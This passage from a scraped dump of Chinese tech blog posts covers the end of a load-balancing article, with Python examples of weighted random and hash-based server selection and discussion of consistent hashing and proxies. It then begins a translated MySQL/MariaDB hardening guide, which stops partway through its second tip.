-->\r\n\r\n\t\t<div id=\"crayon-5a634c07e8889600633699\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ndef normalize_servers(servers):\r\n    normalized_servers = {}\r\n    total = sum(servers.values())\r\n    cur_sum = 0\r\n    for k, v in servers.iteritems():\r\n        normalized_servers[k] = 1.0 * (cur_sum + v) / total\r\n        cur_sum += v\r\n    return normalized_servers\r\n\r\ndef weight_random_choose_ex(normalized_servers):\r\n    import random, operator\r\n    random.seed()\r\n    rand = random.random()\r\n    for k, v in sorted(normalized_servers.iteritems(), key = operator.itemgetter(1)):\r\n        if v &gt;= rand:\r\n            return k\r\n    else:\r\n        assert False, 'Error normalized_servers with rand %s ' % rand</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634c07e8889600633699-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c07e8889600633699-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a634c07e8889600633699-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c07e8889600633699-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a634c07e8889600633699-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c07e8889600633699-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a634c07e8889600633699-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c07e8889600633699-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a634c07e8889600633699-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c07e8889600633699-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a634c07e8889600633699-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c07e8889600633699-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a634c07e8889600633699-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c07e8889600633699-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5a634c07e8889600633699-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c07e8889600633699-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5a634c07e8889600633699-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c07e8889600633699-18\">18</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634c07e8889600633699-1\"><span class=\"crayon-e\">def </span><span class=\"crayon-e\">normalize_servers</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">servers</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c07e8889600633699-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">normalized_servers</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a634c07e8889600633699-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">total</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sum</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">servers</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">values</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c07e8889600633699-4\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">cur_sum</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span></div><div class=\"crayon-line\" id=\"crayon-5a634c07e8889600633699-5\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">k</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">v</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">servers</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">iteritems</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c07e8889600633699-6\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">normalized_servers</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">k</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">cur_sum</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">v</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">total</span></div><div class=\"crayon-line\" id=\"crayon-5a634c07e8889600633699-7\"><span class=\"crayon-e\">        </span><span class=\"crayon-v\">cur_sum</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+=</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">v</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c07e8889600633699-8\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">normalized_servers</span></div><div class=\"crayon-line\" id=\"crayon-5a634c07e8889600633699-9\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c07e8889600633699-10\"><span class=\"crayon-e\">def </span><span class=\"crayon-e\">weight_random_choose_ex</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">normalized_servers</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-5a634c07e8889600633699-11\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">import </span><span class=\"crayon-v\">random</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">operator</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c07e8889600633699-12\"><span class=\"crayon-e\">    </span><span class=\"crayon-v\">random</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">seed</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a634c07e8889600633699-13\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">rand</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">random</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">random</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c07e8889600633699-14\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">k</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">v</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sorted</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">normalized_servers</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">iteritems</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">key</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">operator</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">itemgetter</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-5a634c07e8889600633699-15\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">v</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">rand</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c07e8889600633699-16\"><span class=\"crayon-h\">            </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">k</span></div><div class=\"crayon-line\" id=\"crayon-5a634c07e8889600633699-17\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">else</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c07e8889600633699-18\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">assert</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">False</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'Error normalized_servers with rand %s '</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">%</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">rand</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0037 seconds] -->\r\n\n</div>\n<h2>哈希法（hash）</h2>\n<p>根据客户端的IP，或者请求的“Key”，计算出一个hash值，然后对节点数目取模。好处就是，同一个请求能够分配到同样的服务节点，这对于“有状态”的服务很有必要</p>\n<div>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634c07e888d559142123\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ndef hash_choose(request_info, server_lst):\r\n    hashed_request_info = hash(request_info)\r\n    return server_lst[hashed_request_info % len(server_lst)]</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634c07e888d559142123-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c07e888d559142123-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a634c07e888d559142123-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634c07e888d559142123-1\"><span class=\"crayon-e\">def </span><span class=\"crayon-e\">hash_choose</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">request_info</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">server_lst</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c07e888d559142123-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">hashed_request_info</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">hash</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">request_info</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a634c07e888d559142123-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">server_lst</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">hashed_request_info</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">%</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">len</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">server_lst</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">]</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0010 seconds] -->\r\n\n</div>\n<p>只要hash结果足够分散，也是能做到绝对均衡的。</p>\n<h2>一致性哈希</h2>\n<p>哈希算法的缺陷也很明显，当节点的数目发生变化的时候，请求会大概率分配到其他的节点，引发到一系列问题，比如sticky session。而且在某些情况，比如分布式存储，是绝对的不允许的。</p>\n<p>为了解决这个哈希算法的问题，又引入了<a href=\"https://en.wikipedia.org/wiki/Consistent_hashing\" target=\"_blank\">一致性哈希</a>算法，简单来说，一个物理节点与多个虚拟节点映射，在hash的时候，使用虚拟节点数目而不是物理节点数目。当物理节点变化的时候，虚拟节点的数目无需变化，只涉及到虚拟节点的重新分配。而且，调整每个物理节点对应的虚拟节点数目，也就相当于每个物理节点有不同的权重</p>\n<h2>最少连接算法（least connection）</h2>\n<p>以上的诸多算法，要么没有考虑到节点间的差异（轮训、随机、哈希），要么节点间的权重是静态分配的（加权轮训、加权随机、一致性hash）。</p>\n<p>考虑这么一种情况，某台机器出现故障，无法及时处理请求，但新的请求还是会以一定的概率源源不断的分配到这个节点，造成请求的积压。因此，根据节点的真实负载，动态地调整节点的权重就非常重要。当然，要获得接节点的真实负载也不是一概而论的事情，如何定义负载，负载的收集是否及时，这都是需要考虑的问题。</p>\n<p>每个节点当前的连接数目是一个非常容易收集的指标，因此lease connection是最常被人提到的算法。也有一些侧重不同或者更复杂、更客观的指标，比如最小响应时间（least response time）、最小活跃数（least active）等等。</p>\n<h1>一点思考</h1>\n<h2>有状态的请求</h2>\n<p>首先来看看“算法衡量”中提到的第三个问题：同一个请求是否分发到同样的服务节点，同一个请求指的是同一个用户或者同样的唯一标示。什么时候同一请求最好（必须）分发到同样的服务节点呢？那就是有状态 — 请求依赖某些存在于内存或者磁盘的数据，比如web请求的session，比如分布式存储。怎么实现呢，有以下几种办法：</p>\n<p>（1）请求分发的时候，保证同一个请求分发到同样的服务节点。</p>\n<p>这个依赖于负载均衡算法，比如简单的轮训，随机肯定是不行的，哈希法在节点增删的时候也会失效。可行的是一致性hash，以及分布式存储中的按范围分段（即记录哪些请求由哪个服务节点提供服务），代价是需要在load balancer中维护额外的数据。</p>\n<p>（2）状态数据在backend servers之间共享</p>\n<p>保证同一个请求分发到同样的服务节点，这个只是手段，目的是请求能使用到对应的状态数据。如果状态数据能够在服务节点之间共享，那么也能达到这个目的。比如服务节点连接到共享数据库，或者内存数据库如memcached</p>\n<p>（3）状态数据维护在客户端</p>\n<p>这个在web请求中也有使用，即cookie，不过要考虑安全性，需要加密。</p>\n<h2>关于load balancer</h2>\n<p>接下来回答第四个问题：关于load balancer，其实就是说，在哪里做负载均衡，是客户端还是服务端，是请求的发起者还是请求的3。具体而言，要么是在客户端，根据服务节点的信息自行选择，然后将请求直接发送到选中的服务节点；要么是在服务节点集群之前放一个集中式代理（proxy），由代理负责请求求分发。不管哪一种，至少都需要知道当前的服务节点列表这一基础信息。</p>\n<p>如果在客户端实现负载均衡，客户端首先得知道服务器列表，要么是静态配置，要么有简单接口查询，但backend server的详细负载信息，就不适用通过客户端来查询。因此，客户端的负载均衡算法要么是比较简单的，比如轮训（加权轮训）、随机（加权随机）、哈希这几种算法，只要每个客户端足够随机，按照大数定理，服务节点的负载也是均衡的。要在客户端使用较为复杂的算法，比如根据backend的实际负载，那么就需要去额外的负载均衡服务（external load balancing service）查询到这些信息，在<a href=\"https://github.com/grpc/grpc/blob/master/doc/load-balancing.md\" target=\"_blank\">grpc</a>中，就是使用的这种办法</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/01/5567530ef55fda8f329c24d7c510017a.png\" alt=\"\"></p>\n<p>可以看到，load balancer与grpc server通信，获得grpc server的负载等具体详细，然后grpc client从load balancer获取这些信息，最终grpc client直连到被选择的grpc server。</p>\n<p>而基于Proxy的方式是更为常见的，比如7层的Nginx，四层的F5、LVS，既有硬件路由，也有软件分发。集中式的特点在于方便控制，而且能容易实现一些更精密，更复杂的算法。但缺点也很明显，一来负载均衡器本身可能成为性能瓶颈；二来可能引入额外的延迟，请求一定先发到达负载均衡器，然后到达真正的服务节点。</p>\n<p>load balance proxy对于请求的响应（response），要么不经过proxy，如LVS；要么经过Proxy，如Nginx。下图是LVS示意图（来源见水印）</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/01/67aae7bdbbab3340571198f7ffb00261.png\" alt=\"\"></p>\n<p>而如果response也是走load balancer proxy的话，那么整个服务过程对客户端而言就是完全透明的，也防止了客户端去尝试连接后台服务器，提供了一层安全保障！</p>\n<p>值得注意的是，<strong>load balancer proxy不能成为单点故障</strong>（single point of failure），因此一般会设计为高可用的主从结构</p>\n<h2> 其他</h2>\n<p>在<a href=\"http://www.cnblogs.com/data2value/p/6107653.html\" target=\"_blank\">这篇文章</a>中提到，负载均衡是一种推模型，一定会选出一个服务节点，然后把请求推送过来。而换一种思路，使用消息队列，就变成了拉模型：空闲的服务节点主动去拉取请求进行处理，各个节点的负载自然也是均衡的。消息队列相比负载均衡好处在于，服务节点不会被大量请求冲垮，同时增加服务节点更加容易；缺点也很明显，请求不是事实处理的。</p>\n<p>想到另外一个例子，比如在gunicorn这种pre-fork模型中，master（gunicorn 中Arbiter）会fork出指定数量的worker进程，worker进程在同样的端口上监听，谁先监听到网络连接请求，谁就提供服务，这也是worker进程之间的负载均衡。</p>\n<h1>references</h1>\n<p><a href=\"https://en.wikipedia.org/wiki/Load_balancing_(computing)\" target=\"_blank\">wiki：Load balancing</a></p>\n<p><a href=\"http://zhuanlan.51cto.com/art/201609/517313.htm\" target=\"_blank\">一分钟了解负载均衡的一切</a></p>\n<p><a href=\"https://github.com/grpc/grpc/blob/master/doc/load-balancing.md\" target=\"_blank\">grpc load-balancing.md</a></p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113417\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113417votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113417\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 3 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_img_path": "full/454455dcb286199a6ce66f724472bfe5efeebea7.jpg"}
{"url_object_id": "bf8e18875ff5e8a6c9a717b3ae5bd56d", "title": "12 条用于 Linux 的 MySQL/MariaDB 安全最佳实践", "url": "http://blog.jobbole.com/113422/", "create_date": "2018/01/03", "front_img_url": ["http://jbcdn2.b0.upaiyun.com/2018/01/ede5c3a86638315dfe34f9b1a88065fe.png"], "praise_nums": 1, "comment_nums": 1, "favor_nums": 2, "tags": "IT技术,Linux", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://www.tecmint.com/mysql-mariadb-security-best-practices-for-linux/\">tecmint</a>   译文出处：<a target=\"_blank\" href=\"https://www.oschina.net/translate/mysql-mariadb-security-best-practices-for-linux?print\">oschina</a>   </div><p>MySQL 是世界上最流行的开源数据库系统，MariaDB(一个 MySQL 分支)是世界上增长最快的开源数据库系统。在安装 MySQL 服务器之后，在默认配置下是不安全的，确保数据库安全通常是通用数据库管理的基本任务之一。</p>\n<div>\n<p>这将有助于增强和提升整个 Linux 服务器的安全性，因为攻击者总是扫描系统任意部分的漏洞，而数据库在过去是重点目标区域。一个常见的例子是对 MySQL 数据库的 root 密码的强制破解。</p>\n<p>在本指南中，我们将会讲解对开发者有帮助的 MySQL/MariaDB 的 Linux 最佳安全实践。</p>\n<h1>1. 安全地安装 MySQL</h1>\n<p>这是安装 MySQL 服务器后第一个建议的步骤，用于保护数据库服务器。这个脚本可以帮助您提高 MySQL 服务器的安全性：</p>\n<ul>\n<li>如果您在安装期间没有设置 root 帐户的密码，马上设置它</li>\n<li>通过删除可从本地主机外部访问的 root 帐户来禁用远程 root 用户登录</li>\n<li>删除匿名用户帐户和测试数据库，默认情况下，所有用户、甚至匿名用户都可以访问这些帐户和测试数据库</li>\n</ul>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a635a334a851646822476\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n#&amp;nbsp;mysql_secure_installation</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a635a334a851646822476-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a635a334a851646822476-1\"><span class=\"crayon-p\">#&amp;nbsp;mysql_secure_installation</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>在运行上述命令之后，设置 root 密码并通过输入 [Yes/Y] 和按下 [Enter] 键来回答一系列问题。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/01/f36cccbc6907b330961ecc571419f939.png\"></p>\n<p style=\"text-align: center\"><em>安全安装 MySQL 情况界面</em></p>\n<h1>2. 将数据库服务器绑定到 Loopback 地址</h1>\n<p>此配置将限制来自远程机器的访问，它告诉 MySQL 服务器只接受来自本地主机的连接。你可以在主配置文件中进行设置。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a635a334a85a066907818\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 